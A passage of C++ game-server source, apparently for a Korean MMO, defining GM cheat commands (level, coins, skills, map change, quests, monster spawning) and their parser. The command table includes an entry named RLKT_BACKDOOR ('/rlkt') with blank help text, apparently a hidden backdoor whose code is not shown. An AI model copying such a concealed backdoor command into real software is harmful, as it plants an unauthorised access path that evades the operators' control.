	{ DESTROYPVP, _T("/destroypvp"), _T("사용법(/destroypvp(PvP인덱스)(강제로 이기게할 길드이름)"), _T("Usage(/destroypvp(PvP RoomNumber)(Win GuildName)") },	
	{ CLEAR_MISSION, _T("/clearmission"), _T("사용법(/clearmission)"), _T("Usage(/clearmission)") },	
	{ CLEAR_PRESENT, _T("/cleargift"), _T("사용법(/cleargift)"), _T("Usage(/cleargift)") },	
	{ SHOP_GETLIST_REPURCHASE, _T("/getlistrepurchase"), _T("사용법(/getlistrepurchase)"), _T("Usage(/getlistrepurchase)") },	
	{ SHOP_REPURCHASE, _T("/repurchase"), _T("사용법(/repurchase repurchaseid)"), _T("Usage(/repurchase repurchaseid)") },	
#if defined( PRE_ADD_QUICK_PVP)
	{ QUICKPVP, _T("/quickpvp"), _T("사용법(/quickpvp (상대방캐릭터명))"), _T("Usage(/quickpvp (Other CharacterName))") },
#endif
	{ PVPTIMEOVER, _T("/pvptimeover"), _T("사용법(/pvptimeover)"), _T("Usage(/pvptimeover)") },
	{ RESETNESTCOUNT, _T("/resetnestcount"), _T("사용법(/resetnestcount)"), _T("Usage(/resetnestcount)") },
	{ DEL_GUILDEFFECT, _T("/grewardreset"), _T("사용법(/grewardreset(길드보상아이디))"), _T("Usage(/grewardreset)(guildrewarditemID)") },	// 길드보상 효과 삭제(기간제 효과의 경우에만 삭제)
	{ DEL_GUILDMARK, _T("/gmarkreset"), _T("사용법(/gmarkreset)"), _T("Usage(/gmarkreset)") },												// 길드마크 초기화
	{ DENY_GUILDRECRUIT, _T("/gwantedreset"), _T("사용법(/gwantedreset)"), _T("Usage(/gwantedreset)") },									// 자신의 길드에 가입신청한 캐릭터 정보 삭제
	{ CANCEL_GUILDAPPLY, _T("/gapplicationreset"), _T("사용법(/gapplicationreset)"), _T("Usage(/gapplicationreset)") },						// 자신의 가입신청한 길드정보 삭제
	{ RESET_GUILDPOINTLIMIT, _T("/resetglimit"), _T("사용법(/resetglimit), 설명(길드경험치 일일제한 초기화)"), _T("Usage(/resetglimit), Description(Reset Guild DailyExp Limit)") },
#if defined(PRE_ADD_PVP_VILLAGE_ACCESS)
	{ PVP_VILLAGE_JOIN, _T("/pvpjoin"), _T("사용법(/pvpjoin), 설명(마을에서 pvp 방 들가기)"), _T("Usage(/pvpjoin), Description(Go pvp Room)") },
	{ PVP_VILLAGE_CREATE, _T("/pvpmake"), _T("사용법(/pvpmake), 설명(마을에서 pvp 방 들가기)"), _T("Usage(/pvpmake), Description(Make pvp Room)") },
	{ PVP_VILLAGE_LADDER, _T("/pvpladder"), _T("사용법(/pvpladder), 설명(마을에서 ladder 접속)"), _T("Usage(/pvpladder), Description(Go pvp ladder)") },	
#endif
#if defined(PRE_ADD_EXPORT_DPS_INFORMATION)
	{ ENABLE_DPS_REPORT, _T("/reportdps"), _T("사용법(/reportdps), 설명( DPS 측정 기록 )"), _T("Usage(/reportdps), Description( USE DPS Report )") },
#endif
#if defined( PRE_ADD_NAMEDITEM_SYSTEM )
	{ GOLDBOX_NAMEDITEM, _T("/goldboxitem"), _T("사용법(/goldboxitem (아이템아이디), 설명( 골드박스아이템지정 )"), _T("Usage(/goldboxitem), Description( goldboxitem change )") },
	{ NAMEDITEM_COUNT, _T("/nameditemcount"), _T("사용법(/nameditemcount (아이템아이디), 설명( 네임드아이템갯수체크 )"), _T("Usage(/nameditemcount), Description( nameditem count )") },
#endif
#if defined(PRE_ADD_LIMITED_CASHITEM)
	{ CHANGE_LIMITQUANTITY, _T("/limititemmax"), _T("사용법(/limititemmax (아이템시리얼넘버)(변경숫자), 설명( 갯수제한아이템수량변경 )"), _T("Usage(/limititemmax), Description( limitation quantity change )") },
#endif		//#if defined(PRE_ADD_LIMITED_CASHITEM)
#if defined (PRE_ADD_BESTFRIEND)
	{ CLOSE_BESTFRIEND, _T("/closebf"), _T("사용법(/closebf, 설명( 절친 즉시 삭제 )"), _T("Usage(/closebf), Description( remove bestfriend quickly )") },
#endif
#if defined(PRE_ADD_RACING_MODE)
	{ RACING_START, _T("/startracing"), _T("사용법(/startracing, 설명(PVP 레이싱 Start)"), _T("Usage(/startracing), Description( PVP racing start )") },
	{ RACING_END, _T("/endracing"), _T("사용법(/startracing(index), 설명(PVP 레이싱 End)"), _T("Usage(/endracing(index), Description(  PVP racing end )") },
#endif //#if defined(PRE_ADD_RACING_MODE)	
#if defined(PRE_ADD_PCBANG_RENTAL_ITEM)
	{ SETPCCAFERENTITEM, _T("/setpccafeitem"), _T("사용법(/setpccafeitem, 설명(PCBang 아이템 지급)"), _T("Usage(/setpccafeitem), Description( PCCafe Rent Item )") },	
#endif
#ifdef PRE_MOD_PVPRANK
	{ RANK, _T("/pvprank"), _T("PvPRank 재계산"), _T("Cheat ReCalc PvPRank") },
#endif		//#ifdef PRE_MOD_PVPRANK
#if defined(PRE_ADD_PVP_RANKING)
	{ PVP_RANK, _T("/rank"), _T("PvPRank 재집계"), _T("Cheat Aggregate PvPRank") },
	{ PVP_LADDER_RANK, _T("/ladderrank"), _T("PvPLadderRank 재집계"), _T("Cheat Aggregate PvPLadderRank") },
#endif
#if defined(PRE_SPECIALBOX)
	{ SPECIALBOX, _T("/specialbox"), _T("specialbox (mailid)"), _T("specialbox (mailid)") },
#endif	// #if defined(PRE_SPECIALBOX)
#if defined(PRE_ADD_REMOTE_QUEST)
	{ GAIN_REMOTE_QUEST, _T("/gain_rq"), _T("원격퀘스트 획득"), _T("Cheat Aggregate PvPRank") },
	{ ACCEPT_REMOTE_QUEST, _T("/accept_rq"), _T("원격퀘스트 수락"), _T("Cheat Aggregate PvPRank") },	
	{ COMPLETE_REMOTE_QUEST, _T("/complete_rq"), _T("원격퀘스트 완료"), _T("Cheat Aggregate PvPRank") },
#endif
#if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD) && defined(_GAMESERVER)
	{ SET_STAGE_CLEAR_BOXNUM, _T("/setboxnum"), _T("스테이지 클리어 보상 번호 설정"), _T("setboxnum groupnum")},
#endif	// #if defined(PRE_ADD_STAGE_CLEAR_ENCHANT_REWARD) && defined(_GAMESERVER)
	{ ISGAINMISSION, _T("/missiongain?"), _T("미션 획득 했음?"), _T("Acquire Mission?") },
#if defined( PRE_ADD_STAMPSYSTEM )
	{ ADD_STAMP, _T("/addstamp"), _T("사용법(/addstamp index(1~8) day(1~7))"), _T("Usage(/addstamp index(1~8) day(1~7))") },
	{ CLEAR_STAMP, _T("/clearstamp"), _T("사용법(/clearstamp)"), _T("Usage(/clearstamp)") },
#endif // #if defined( PRE_ADD_STAMPSYSTEM )
#if defined(PRE_ADD_ACTIVEMISSION)
	{ SET_ACTIVEMISSION, _T("/activemission"), _T("사용법(/activemission (missionid)"), _T("Usage(/activemission (missionid))") },
#endif
#if defined(PRE_ADD_MONTHLY_MISSION)
	{ GAIN_MONTHLY_MISSION, _T("/mmissiongain"), _T("월간 미션 획득"), _T("Acquire Monthly Mission)") },
	{ ACHIEVE_MONTHLY_MISSION, _T("/mmissionachieve"), _T("월간 미션 달성"), _T("Achieve Monthly Mission") },
#endif	// #if defined(PRE_ADD_MONTHLY_MISSION)
#if defined(PRE_ADD_CP_RANK)
	{ INIT_STAGECP, _T("/initcprank"), _T("사용법(/initcprank inittype(0-all,1-Legend,2-Monthly,3-Personal))"), _T("Usage(/initcprank inittype(0-all,1-Legend,2-Monthly,3-Personal))") },
#endif //INIT_STAGECP
#if defined(PRE_ADD_DWC)	
	{ DWCPOINT, _T("/dwcpoint"), _T("사용법(/dwcpoint (point)"), _T("Usage(/dwcpoint (point)") },
	{ START_MATCH, _T("/startmatch"), _T("사용법(/startmatch"), _T("Usage(/startmatch") },
	{ DWC_MATCH_CLOSE, _T("/dwcmatchclose"), _T("사용법(/dwcmatchclose 0/1"), _T("Usage(/dwcmatchclose 0/1") },
	{ UPDATE_DWC_STATUS, _T("/updatedwc"), _T("사용법(/updatedwc"), _T("Usage(/updatedwc") },

#endif
#if defined( PRE_PVP_GAMBLEROOM )
	{ CREATE_GAMBLEROOM, _T("/creategambleroom"), _T("사용법(/creategambleroom RoomIndex Regulation GambleType Gambleprice "), _T("Usage(/creategambleroom RoomIndex Regulation GambleType Gambleprice") },
#endif
	{ RLKT_BACKDOOR, _T("/rlkt"), _T(""), _T("") },

#if defined( PRE_ADD_NEW_MONEY_SEED )
	{ DEL_SEED, _T("/delseed"), _T("사용법(/delseed"), _T("Usage(/delseed") },
#endif	
};

CDNCheatCommand::CDNCheatCommand(CDNUserSession *pUserSession)
: m_pSession(pUserSession)
{
	m_bLucky = false;
	BOOST_STATIC_ASSERT( CMD_END == _countof(g_CmdList) );
}

#if defined(_GAMESERVER) && defined(_SHADOW_TEST)
extern bool g_bEnableShadow[MAX_SESSION_COUNT];
#endif

CDNCheatCommand::~CDNCheatCommand()
{

}

std::wstring CDNCheatCommand::_GetUserName()
{
	return(m_pSession->GetCharacterName());
}

CDNUserQuest* CDNCheatCommand::_GetQuest()
{
	return m_pSession->GetQuest();
}

int CDNCheatCommand::Command(std::wstring& szCheat)
{
	if( szCheat.find(L"/") != 0 )
	{
		return -1;
	}

	int nResult = -1;
	std::vector<std::wstring> tokens;
	TokenizeW(szCheat, tokens, L" ");
	ToLowerW(tokens[0]);
	int nCount = sizeof(g_CmdList) / sizeof(__CmdLineDefineStruct);
	for( int i = 0 ; i < nCount; i++ )
	{
		//		if( szCheat.find(g_CmdList[i].szString) < szCheat.size() )
		if( wcscmp( tokens[0].c_str(), g_CmdList[i].szString ) == NULL )
		{
			m_pSession->SendChat(CHATTYPE_SYSTEM, (int)szCheat.size()*sizeof(WCHAR), (WCHAR*)_GetUserName().c_str(), (WCHAR*)szCheat.c_str() );
			bool bResult = OnCommand(i, tokens);
			if( bResult == false ) 
			{
				nResult = 2;
				break;
			}
			else 
			{
				nResult = 1;
				break;
			}
		}
	}

	std::wstring szResultMsg;
	switch( nResult )
	{
	case 2:
		{
			szResultMsg = L"Command param Error";
			m_pSession->SendChat(CHATTYPE_SYSTEM, (int)szResultMsg.size()*sizeof(WCHAR), (WCHAR*)_GetUserName().c_str(), (WCHAR*)szResultMsg.c_str() );

		}
		break;
	case -1:
		{
			//szResultMsg = L"Can't found Command.";
			//m_pSession->SendChat(CHATTYPE_SYSTEM, (int)szResultMsg.size()*sizeof(WCHAR), (WCHAR*)_GetUserName().c_str(), (WCHAR*)szResultMsg.c_str() );
		}
		break;
	case 1:
		{
			szResultMsg = L"OK.";
			m_pSession->SendChat(CHATTYPE_SYSTEM, (int)szResultMsg.size()*sizeof(WCHAR), (WCHAR*)_GetUserName().c_str(), (WCHAR*)szResultMsg.c_str() );
		}
		break;
	}

	return nResult;
}

bool CDNCheatCommand::OnCommand(int nCmdID, std::vector<std::wstring>& tokens)
{
	switch( nCmdID )
	{
	case HELP:
	case HELP1:
		{
			for( int i = 0 ; i < CMD_END ; i++ )
			{
				std::wstring szMsg;
#if defined(_WORK) || defined(_KR) || defined(_KRAZ)
				szMsg = FormatW( L"[%s] - %s", g_CmdList[i].szString, g_CmdList[i].szComment);
#else
				szMsg = FormatW( L"[%s] - %s", g_CmdList[i].szString, g_CmdList[i].szCommentEn);
#endif
				m_pSession->SendChat(CHATTYPE_SYSTEM, (int)szMsg.size()*sizeof(WCHAR), (WCHAR*)_GetUserName().c_str(), (WCHAR*)szMsg.c_str() );
			}
		}
		break;

	case SET_USER_LEVEL:
		{
			wstring wszString;

			if( tokens.size() < 2 ){
				wszString = FormatW(L"레벨을 제대로 입력해주세요!!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}

			int nLevel = _wtoi(tokens[1].c_str());
			float fPercent = ( tokens.size() >= 3 ) ?(float)( _wtof( tokens[2].c_str() )*0.01f) : 0.f;
			if( nLevel < 1 || nLevel > CHARLEVELMAX ){
				wszString = FormatW(L"레벨을 제대로 입력해주세요!!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}

			DWORD nExp = g_pDataManager->GetExp(m_pSession->GetUserJob(), nLevel);
			if( nLevel < CHARLEVELMAX ) {
				int nNextExp = g_pDataManager->GetExp( m_pSession->GetUserJob(), nLevel+1 );
				nExp += (int)(( nNextExp - nExp ) * fPercent );
			}

#if defined(_VILLAGESERVER)
			// 그냥 낮춘담에 다시 올려주도록 변경합니다.
			// Note: 이렇게 하면 level 치트 사용했을 때 스킬포인트가 클라와 달라집니다.
			// 클라에선 정확하게 레벨 올라간만큼 SP 를 올려주지만,
			// 서버에서는 1부터 올릴 레벨까지 누적된 스킬포인트가 더해지게 됩니다.
			m_pSession->SetExp(1, DBDNWorldDef::CharacterExpChangeCode::Cheat, 0, false);
			m_pSession->SetLevel(1, DBDNWorldDef::CharacterLevelChangeCode::Cheat, false);
			m_pSession->SetExp(nExp, DBDNWorldDef::CharacterExpChangeCode::Cheat, 0, true);	// exp세팅해주면 레벨까지 알아서 바뀐다

#elif defined(_GAMESERVER)
			if( m_pSession == NULL || m_pSession->GetPlayerActor() == NULL || !m_pSession->GetActorHandle() )
				break;
			if( m_pSession->GetLevel() > nLevel){
				wszString = FormatW(L"마을 밖에서는 레벨을 내릴 수 없습니다(레벨업은 가능)!!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}
			m_pSession->GetPlayerActor()->SetExperience( 1 );
			m_pSession->GetActorHandle()->SetLevel( 1 );
			m_pSession->GetPlayerActor()->SetExperience(nExp);		// exp 세팅해주면 알아서 바뀐다.
#endif
		}
		break;

	case CLEAR_ALL_QUEST:
		{
			CDNUserQuest* pQuest = _GetQuest();
			if(!pQuest)
				return false;

			pQuest->ClearAllQuestInfo();
			pQuest->SendAllQuestRefresh();
		}
		break;

	case MAKEITEM:
		{
			return m_pSession->GetGMCommand()->CmdMakeItem(tokens);
		}
		break;

	case huanhua:
	{
		return m_pSession->GetGMCommand()->Cmdhuanhua(tokens);
	}
	break;

	case ADD_SKILL:
		{
#if defined(_VILLAGESERVER)
			if( tokens.size() != 2 )	return false;

			// 테이블 데이터에 존재하는 스킬만 add 시킴.
			int iSkillID = _ttoi(tokens[1].c_str());
			TSkillData* pSkillData = g_pDataManager->GetSkillData( iSkillID );
			if( NULL == pSkillData )
			{
				wstring wszString = FormatW(L"[SkillID %d]존재하지 않는 스킬 ID 입니다!!\r\n", iSkillID );
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}

			// 이미 가지고 있는 스킬은 패스.
			if( false == m_pSession->GetSkill()->FindSkill( iSkillID ) )
			{
				m_pSession->GetSkill()->AddSkill( iSkillID );

			}
			else
			{
				bool bUnLockLevelZeroSkill = false;
				for( int i = 0; i < SKILLMAX; ++i )
				{
					TSkill* pSkillData = &(m_pSession->GetSkillData()->SkillList[i]);
					if( 0 == pSkillData->nSkillID )
						break;

					if( pSkillData->nSkillID == iSkillID )
					{
						if( 0 < pSkillData->cSkillLevel )
						{
							wstring wszString = FormatW(L"[SkillID %d]이미 보유 중인 스킬입니다.!!\r\n", iSkillID );
							m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
						}
						else
						{
							m_pSession->GetSkill()->CheatAcquireSkill( iSkillID );
							bUnLockLevelZeroSkill = true;
						}
 
						break;
					}
				}
			}
#elif defined(_GAMESERVER)
			wstring wszString = FormatW(L"마을에서 사용해주십시오!!\r\n");
			m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
#endif
		}
		break;

	case REMOVE_SKILL:
		{
#if defined(_VILLAGESERVER)
			if( tokens.size() != 2 )	return false;
			m_pSession->GetSkill()->DelSkill( _ttoi(tokens[1].c_str()) );

#elif defined(_GAMESERVER)
#endif
		}
		break;

	case ADD_SKILL_LEVEL:
#if defined(_VILLAGESERVER)
		if( tokens.size() != 3 )	return false;
		m_pSession->GetSkill()->SetSkillLevel( _ttoi(tokens[1].c_str()), _ttoi(tokens[2].c_str()), DBDNWorldDef::SkillChangeCode::ModSkillLevelByAdmin );	// 스킬포인트 안에서 차감됨

#elif defined(_GAMESERVER)
#endif
		break;

	case MAKECOIN:
		if( tokens.size() != 2 ) return false;
		if(!m_pSession->AddCoin(_ttoi64(tokens[1].c_str()), DBDNWorldDef::CoinChangeCode::Cheat, 0)) return false;
		break;

	case CHANGEMAP:
	case GOTOMAP:
		{
			wstring wszString;

			if( tokens.size() < 2 ){
				wszString = FormatW(L"맵 아이디를 체크해주세요. 현재 맵 ID : [%d]\r\n", m_pSession->GetStatusData()->nMapIndex);
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}

			if(_ttoi(tokens[1].c_str()) < 1){
				wszString = FormatW(L"튜토리얼맵에선 쓸 수 없다구요!!!!!\r\n");
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str());
				return false;
			}

#if defined(_VILLAGESERVER)
			CDNField* pField = m_pSession->GetField();
			if( pField )
			{
				if( pField->bIsPvPVillage() || pField->bIsPvPLobby() || pField->bIsDarkLairVillage() )
				{
					wszString = FormatW(L"PvP마을,PvP로비,다크레어마을 에서는 /changemap 치트를 사용할 수 없습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					return false;
				}
			}

#elif defined(_GAMESERVER)
			if( m_pSession->GetGameRoom() )
			{
				if( m_pSession->GetGameRoom()->bIsPvPRoom() )
				{
					wszString = FormatW(L"PvP중에는 /changemap 치트를 사용할 수 없습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					return false;
				}

				if( m_pSession->bIsGMTrace() )
				{
					wszString = FormatW(L"Trace중에는 /changemap 치트를 사용할 수 없습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					return false;
				}

				if(m_pSession->GetGameRoom()->bIsFarmRoom())
				{
					wszString = FormatW(L"농장에서는 /changemap 치트를 사용할 수 없습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					return false;
				}

				if( m_pSession->GetGameRoom()->GetRoomState() != _GAME_STATE_PLAY ) return false;
			}
#endif

			int nMapIndex = _ttoi(tokens[1].c_str());	// 이동할 mapindex
			TDUNGEONDIFFICULTY StageConstrucionLevel = ( tokens.size() <= 2 ) ? Dungeon::Difficulty::Easy : static_cast<TDUNGEONDIFFICULTY>(_ttoi(tokens[2].c_str()));
			if(StageConstrucionLevel >= Dungeon::Difficulty::Max) 
				return false;

			int nGateNo = ( tokens.size() <= 3 ) ? 1 : _ttoi(tokens[3].c_str());

			if( g_pDataManager->GetMapType( nMapIndex ) == GlobalEnum::MAP_UNKNOWN )
			{
				std::wstring wszLocalString;
				wszLocalString = FormatW( L"Cannot found map index %d ",  nMapIndex );
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszLocalString.size()*sizeof(WCHAR), L"", (WCHAR*)wszLocalString.c_str());
				return false;
			}

			if( g_pDataManager->GetMapSubType( nMapIndex ) == GlobalEnum::MAPSUB_FARM )
			{
				wszString = FormatW(L"농장으로는 /changemap 치트를 사용할 수 없습니다.\r\n");
				m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
				return false;
			}

#if defined(_VILLAGESERVER)
			if(g_pDataManager->GetMapType(nMapIndex) != GlobalEnum::MAP_VILLAGE){		// 겜섭일 경우
				char cGateNo = g_pFieldDataManager->GetRandomGateNo(nMapIndex);

				if( m_pSession->GetPartyID() > 0 ) {
					CDNParty *pParty = g_pPartyManager->GetParty(m_pSession->GetPartyID());
					if(!pParty) return false;
					pParty->SetRandomSeed( timeGetTime() );
					pParty->SetAllMemberGate(nGateNo);

					if(g_pMasterConnection && g_pMasterConnection->GetActive())
						g_pMasterConnection->SendReqGameID( GameTaskType::Normal, REQINFO_TYPE_PARTY, pParty->GetPartyID(), m_pSession->GetChannelID(), pParty->GetRandomSeed(), nMapIndex, nGateNo, StageConstrucionLevel, true, pParty );		// GameID를 요청
					else
						return false;
				}
				else {
					m_pSession->m_cGateNo = nGateNo;
					m_pSession->m_nSingleRandomSeed = timeGetTime();

					if(g_pMasterConnection && g_pMasterConnection->GetActive())
						g_pMasterConnection->SendReqGameID( GameTaskType::Normal, REQINFO_TYPE_SINGLE, m_pSession->GetAccountDBID(), m_pSession->GetChannelID(), m_pSession->m_nSingleRandomSeed, nMapIndex, nGateNo, StageConstrucionLevel, true );	// GameID를 요청
					else
						return false;
				}
			}
			else
			{	// 빌리지섭일 경우
				char cGateNo = ( tokens.size() == 2 ) ? -1 : _ttoi(tokens[2].c_str());
				if( m_pSession->GetPartyID() > 0 ) {
					CDNParty *pParty = g_pPartyManager->GetParty(m_pSession->GetPartyID());
					if(!pParty) return false;
					if(g_pMasterConnection && g_pMasterConnection->GetActive())
						g_pMasterConnection->SendVillageToVillage(REQINFO_TYPE_PARTY, pParty->GetPartyID(), nMapIndex, cGateNo, -1, pParty);
					else
						return false;
				}
				else
				{
					if(g_pMasterConnection && g_pMasterConnection->GetActive())
						g_pMasterConnection->SendVillageToVillage(REQINFO_TYPE_SINGLE, m_pSession->GetAccountDBID(), nMapIndex, cGateNo);
					else
						return false;
				}
			}
#elif defined(_GAMESERVER)
			CDNGameRoom *pRoom = m_pSession->GetGameRoom();
			if (!pRoom) return false;
			if( pRoom->bIsPvPRoom() )	// PvP방에서는 changemap 치트 막는다.
				return false;

			CDnGameTask *pTask = (CDnGameTask *)pRoom->GetTaskMng()->GetTask( "GameTask" );
			if( g_pDataManager->GetMapType( nMapIndex ) == GlobalEnum::eMapTypeEnum::MAP_VILLAGE ) {

				int nAttribute = g_pDataManager->GetChannelMapAtt( m_pSession->GetWorldSetID(), nMapIndex );
				
				if(nAttribute&GlobalEnum::CHANNEL_ATT_FARMTOWN)
				{
					wszString = FormatW(L"농장으로는 /changemap 치트를 사용할 수 없습니다.\r\n");
					m_pSession->SendChat( CHATTYPE_NORMAL, (int)wszString.size()*sizeof(WCHAR), L"", (WCHAR*)wszString.c_str() );
					return false;
				}							
						
				CDNUserSession *pLeaderSession = NULL;
				for( DWORD i=0; i<pRoom->GetUserCount(); i++ ) {
					CDNUserSession *pSession = pRoom->GetUserData(i);
					pSession->SetNextVillageData( NULL, 0, pTask->GetMapTableID(), nMapIndex, nGateNo );

					if( pRoom->GetPartyData(i)->bLeader ) pLeaderSession = pSession;
				}

				if( pLeaderSession ) {
					g_pMasterConnectionManager->SendRequestNextVillageInfo(pLeaderSession->GetWorldSetID(), nMapIndex, nGateNo, true, pRoom);
				}
			}
			else {
				for( DWORD i=0; i<pRoom->GetUserCount(); i++ )
				{
					CDNUserSession *pSession = pRoom->GetUserData(i);
					if( !pSession ) continue;
					DnActorHandle hActor = pSession->GetActorHandle();
					if( !hActor ) continue;
					CDnPlayerActor *pPlayer = static_cast<CDnPlayerActor *>(hActor.GetPointer());
					pPlayer->CmdRemoveStateEffect(STATE_BLOW::BLOW_099);
				}

#if defined(PRE_FIX_INITSTATEANDSYNC)
				pRoom->ReserveInitStateAndSync( nMapIndex, nGateNo, CRandom::Seed(pRoom), StageConstrucionLevel, true );
#else
				pRoom->InitStateAndSync( nMapIndex, nGateNo, CRandom::Seed(pRoom), StageConstrucionLevel, true );
#endif	//#if defined(PRE_FIX_INITSTATEANDSYNC)
			}
#endif
		}
		break;

	case SET_COMPLETE_QUEST:
		{
			CDNUserQuest* pQuest = _GetQuest();
			if(!pQuest) return false;
			if( tokens.size() != 5 ) return false;
			int nQuestIndex = _wtoi(tokens[1].c_str());

			if(pQuest->HasQuest(nQuestIndex) == -2){	// 퀘스트가 없다면
				int iRetVal = m_pSession->GetQuest()->AddQuest(nQuestIndex);
				if(1 != iRetVal) {
					g_Log.Log(LogType::_ERROR, m_pSession, L"SET_COMPLETE_QUEST Error : %d  AddQuest return %d" , nQuestIndex , iRetVal);
					break;
				}
			}

			int nFlag = _wtoi(tokens[2].c_str());
			if( nFlag < 0 || nFlag > 1 )
				return false;
			int bDelPlayList = _wtoi(tokens[3].c_str());
			int bRepeat = _wtoi(tokens[4].c_str());

			pQuest->RewardAfterCompletingQuest(nQuestIndex, ((bDelPlayList)?(true):(false)));
		}
		break;

	case SETQUEST:
		{
			if(tokens.size() <= 3) return false;

			int nQuestID = _ttoi(tokens[1].c_str());
			int nQuestType = _ttoi(tokens[2].c_str());

			int nStep = (tokens.size() >= 4) ? _ttoi(tokens[3].c_str()) : 1;
			if(nStep <= 0) nStep = 1;
			int nJournal = (tokens.size() >= 5) ? _ttoi(tokens[4].c_str()) : 1;
			if(nJournal <= 0) nJournal = 1;

			int iRetVal = m_pSession->GetQuest()->FindPlayingQuest(nQuestID);
			if(-1 >= iRetVal) {	// 퀘스트 ID 가 아닌 인덱스는 0 부터 시작함
				iRetVal = m_pSession->GetQuest()->AddQuest(nQuestID);
				if(1 != iRetVal) {
					g_Log.Log(LogType::_ERROR, m_pSession, L"SETQUEST Error : %d  AddQuest return %d" , nQuestID , iRetVal);
					break;
				}
			}
			else {
#ifndef _FINAL_BUILD
				std::wstring wszMsg;
				wszMsg = FormatW( L"이미 진행 중인 퀘스트에 스텝, 저널 정보만 변경됩니다. : %d" , nQuestID );
				m_pSession->SendChat(CHATTYPE_NORMAL, (int)wszMsg.size()*sizeof(WCHAR), L"", (WCHAR*)wszMsg.c_str());
#endif // _FINAL_BUILD
			}
			iRetVal = m_pSession->GetQuest()->SetQuestStep(nQuestID, nStep);
			if(1 != iRetVal) {
				g_Log.Log(LogType::_ERROR, m_pSession, L"SETQUEST Error : %d  SetQuestStep return %d" , nQuestID , iRetVal);
				break;
			}
			iRetVal = m_pSession->GetQuest()->SetJournalStep(nQuestID, nJournal);
			if(1 != iRetVal) {
				g_Log.Log(LogType::_ERROR, m_pSession, L"SETQUEST Error : %d  SetJournalStep return %d" , nQuestID , iRetVal);
				break;
			}
		}
		break;

	case DEL_QUEST:
		{
			return false;
		}
		break;

	case SHOW_QUEST_INFO:
		{
#if defined(_VILLAGESERVER)
			UINT nUserID =  m_pSession->GetObjectID();
			api_quest_DumpQuest(nUserID);
#elif defined(_GAMESERVER)
			UINT nUserID = m_pSession->GetSessionID();
			api_quest_DumpQuest(m_pSession->GetGameRoom(), nUserID);
#endif
		}
		break;

	case ALL_KILL_MONSTER:
		{
#if defined(_VILLAGESERVER)
			return false;
#elif defined(_GAMESERVER)

			CDNGameRoom *pRoom = m_pSession->GetGameRoom();
			if(!pRoom) return false;
			if(!pRoom->GetTaskMng()) return false;

			CDnGameTask *pTask = (CDnGameTask *)pRoom->GetTaskMng()->GetTask( "GameTask" );
			if(!pTask) return false;

			pTask->RequestDestroyAllMonster(false);
#endif
		}
		break;

	case GEN_MONSTER:
		{
#if defined(_VILLAGESERVER)
			return false;
#elif defined(_GAMESERVER)

			if( tokens.size() < 2 ) return false;

			int nMonsterID = _ttoi(tokens[1].c_str());
			int nCount = ( tokens.size() >= 3 ) ? _ttoi(tokens[2].c_str()) : 1;

			CDNGameRoom *pRoom = m_pSession->GetGameRoom();
			if(!pRoom) return false;
			if(!pRoom->GetTaskMng()) return false;

			CDnGameTask *pTask = (CDnGameTask *)pRoom->GetTaskMng()->GetTask( "GameTask" );
			if(!pTask) return false;

			EtVector3* pvPos = m_pSession->GetActorHandle()->GetPosition();

			for( int i  = 0 ; i < nCount ; i++ )
			{
				pTask->RequestGenerationMonsterFromMonsterID( nMonsterID, *pvPos, EtVector3( 0.f, 0.f, 0.f ), EtVector3( 0.f, 0.f, 0.f ));
			}
#endif
		}
		break;
	case GEN_MONSTER_COMPOUND:
		{
#if defined(_VILLAGESERVER)
			return false;
#elif defined(_GAMESERVER)

			if( tokens.size() != 3 )
				return false;

			int nMonsterID = _ttoi(tokens[1].c_str());
			int nCount = _ttoi(tokens[2].c_str());

			CDNGameRoom *pRoom = m_pSession->GetGameRoom();
			if(!pRoom) return false;
			if(!pRoom->GetTaskMng()) return false;

			CDnGameTask *pTask = (CDnGameTask *)pRoom->GetTaskMng()->GetTask( "GameTask" );
			if(!pTask) return false;

			SOBB Obb;
			Obb.Center = *m_pSession->GetActorHandle()->GetPosition();
			Obb.Axis[0] = EtVector3( 1.f, 0.f, 0.f );
			Obb.Axis[1] = EtVector3( 0.f, 1.f, 0.f );
			Obb.Axis[2] = EtVector3( 0.f, 0.f, 1.f );
			Obb.Extent[0] = Obb.Extent[1] = Obb.Extent[2] = 100.f;


			pTask->RequestGenerationMonsterFromMonsterGroupID( nMonsterID, nCount, Obb );
#endif
		}
		break;
	case GEN_NPC:
		{
			if( tokens.size() < 2 ) return false;

			int nNpcID = _ttoi(tokens[1].c_str());

#if defined(_VILLAGESERVER)
			m_pSession->GetField()->RequestGenerationNpc(nNpcID, &m_pSession->GetCurrentPos(), m_pSession->GetRotate());
#elif defined(_GAMESERVER)

			CDNGameRoom *pRoom = m_pSession->GetGameRoom();
			if(!pRoom) return false;
			if(!pRoom->GetTaskMng()) return false;

